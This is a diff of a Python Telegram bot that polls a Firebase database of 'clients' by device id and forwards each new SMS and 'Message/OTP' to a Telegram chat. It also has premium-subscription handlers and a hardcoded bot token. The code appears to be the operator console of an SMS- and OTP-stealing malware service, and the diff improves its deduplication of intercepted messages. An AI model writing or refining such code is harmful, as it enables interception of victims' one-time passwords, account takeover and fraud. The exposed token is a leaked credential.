@@ -185,31 +185,36 @@ async def add_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def monitor_task(chat_id, context):
     global is_monitoring, selected_device_id
     
-    # 1. Start hote waqt existing keys ka snapshot lelo
-    last_processed_ids = set()
+    # 1. Monitoring start hote hi current status capture karo
+    # Ye step purane messages ko ignore karne ke liye hai
     try:
-        sms_data = requests.get(f"{firebase_base}/{selected_device_id}/sms.json").json() or {}
-        msg_data = requests.get(f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json").json() or {}
-        last_processed_ids.update(sms_data.keys())
-        last_processed_ids.update(msg_data.keys())
-    except: pass
+        sms_url = f"{firebase_base}/{selected_device_id}/sms.json"
+        msg_url = f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json"
+        
+        sms_data = requests.get(sms_url).json() or {}
+        msg_data = requests.get(msg_url).json() or {}
+        
+        # 'seen_keys' mein hum woh saare message keys daal rahe hain jo abhi मौजूद hain
+        seen_keys = set(sms_data.keys()) | set(msg_data.keys())
+    except:
+        seen_keys = set()
     
     while is_monitoring:
         try:
-            sms_url = f"{firebase_base}/{selected_device_id}/sms.json"
-            sms_data = requests.get(sms_url).json()
+            # 2. Check SMS
+            sms_data = requests.get(f"{firebase_base}/{selected_device_id}/sms.json").json()
             if sms_data and isinstance(sms_data, dict):
                 for key, val in sms_data.items():
-                    if key not in last_processed_ids:
-                        last_processed_ids.add(key)
+                    if key not in seen_keys:
+                        seen_keys.add(key)
                         await context.bot.send_message(chat_id=chat_id, text=f"📱 New SMS:\n{val}")
             
-            msg_url = f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json"
-            msg_data = requests.get(msg_url).json()
+            # 3. Check Messages/OTP
+            msg_data = requests.get(f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json").json()
             if msg_data and isinstance(msg_data, dict):
                 for key, val in msg_data.items():
-                    if key not in last_processed_ids:
-                        last_processed_ids.add(key)
+                    if key not in seen_keys:
+                        seen_keys.add(key)
                         await context.bot.send_message(chat_id=chat_id, text=f"📩 New Message/OTP:\n{val}")
         except: pass
         await asyncio.sleep(5)
@@ -249,7 +254,7 @@ async def forward_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.effective_chat.send_message(f"❌ Error: {str(e)}")
 
 if __name__ == '__main__':
-    TOKEN = '8720005848:AAGxPsJFZTG1-4boeVFXoKYOMOK5QMnyuf44'
+    TOKEN = '8720005848:AAGxPsJFZTG1-4boeVFXoKYOMOK5QMnyuf4'
     app = ApplicationBuilder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("addpremium", add_premium))
